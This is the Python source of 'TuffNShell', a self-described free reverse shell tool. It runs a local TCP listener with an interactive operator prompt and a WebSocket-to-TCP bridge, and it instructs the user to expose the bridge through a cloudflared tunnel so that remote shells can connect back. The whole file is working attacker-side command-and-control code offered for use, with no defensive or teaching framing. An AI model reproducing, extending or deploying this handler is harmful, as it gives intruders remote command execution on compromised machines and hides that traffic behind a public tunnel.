
import os
import asyncio
import websockets
import sys
from rich.console import Console
from rich.panel import Panel

console = Console()

os.system('clear')

BANNER = """[bold cyan]
  ______      _________   _______ __         ____
 /_  __/_  __/ __/ __/ | / / ___// /_  ___  / / /
  / / / / / / /_/ /_/  |/ /\__ \/ __ \/ _ \/ / /
 / / / /_/ / __/ __/ /|  /___/ / / / /  __/ / /
/_/  \__,_/_/ /_/ /_/ |_//____/_/ /_/\___/_/_/
[/bold cyan]
[bold yellow]TuffNShell WS-TCP Bridge[/bold yellow]
[italic dim]Simple Reverse Shell use WS-TCP Bridge (100% Free)[/italic dim]
"""

LOCAL_TCP_PORT = 4444
WS_PORT = 6767

console.print(BANNER)
console.print()

async def handle_shell_session(reader, writer):
    loop = asyncio.get_event_loop()

    prompt = "[bold cyan]┌─[ [/bold cyan][bold magenta]brad4r@tuffnshell[/bold magenta][bold cyan] ]──[ [/bold cyan][yellow]~[/yellow][bold cyan] ]\n└──╼ $ [/bold cyan]"

    async def forward_stdin():
        try:
            console.print(prompt, end="")
            while True:
                cmd = await loop.run_in_executor(None, sys.stdin.readline)
                if not cmd:
                    break
                writer.write(cmd.encode('utf-8'))
                await writer.drain()
                await asyncio.sleep(0.3)
                console.print(prompt, end="")
        except Exception:
            pass

    async def forward_stdout():
        try:
            buffer = ""
            while True:
                data = await reader.read(4096)
                if not data:
                    break

                decoded = data.decode('utf-8', errors='ignore')
                buffer += decoded

                if "\n" in buffer or len(buffer) > 100:
                    cleaned_output = buffer.strip()
                    if cleaned_output:
                        console.print(Panel(
                            cleaned_output,
                            title="[bold green][/bold green]",
                            border_style="cyan",
                            expand=False
                        ))
                    buffer = ""
        except Exception:
            pass

    await asyncio.gather(forward_stdin(), forward_stdout())
    writer.close()
    await writer.wait_closed()

async def forward_data(reader, writer, websocket):
    async def ws_to_tcp():
        async for msg in websocket:
            if isinstance(msg, str):
                msg = msg.encode()
            writer.write(msg)
            await writer.drain()
    async def tcp_to_ws():
        while True:
            data = await reader.read(4096)
            if not data:
                break
            await websocket.send(data)
    await asyncio.gather(ws_to_tcp(), tcp_to_ws())

async def ws_handler(websocket):
    try:
        reader, writer = await asyncio.open_connection('127.0.0.1', LOCAL_TCP_PORT)
        await forward_data(reader, writer, websocket)
    except Exception:
        pass

async def main():
    tcp_server = await asyncio.start_server(handle_shell_session, '127.0.0.1', LOCAL_TCP_PORT)

    async with websockets.serve(ws_handler, "127.0.0.1", WS_PORT):
        console.print(f"[bold blue]--> Tunnel run on 127.0.0.1:{WS_PORT} - This tool was created by a beginner, if you have any suggestions,  please convey [/bold blue]")
        console.print("[yellow]Run: cloudflared tunnel --url http://localhost:6767[/yellow]")
        console.print("[dim]if it has been run before then ignore this message[/dim]")
        console.print()
        console.print("waiting for connection..")
        await asyncio.Future()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        os.system('clear')
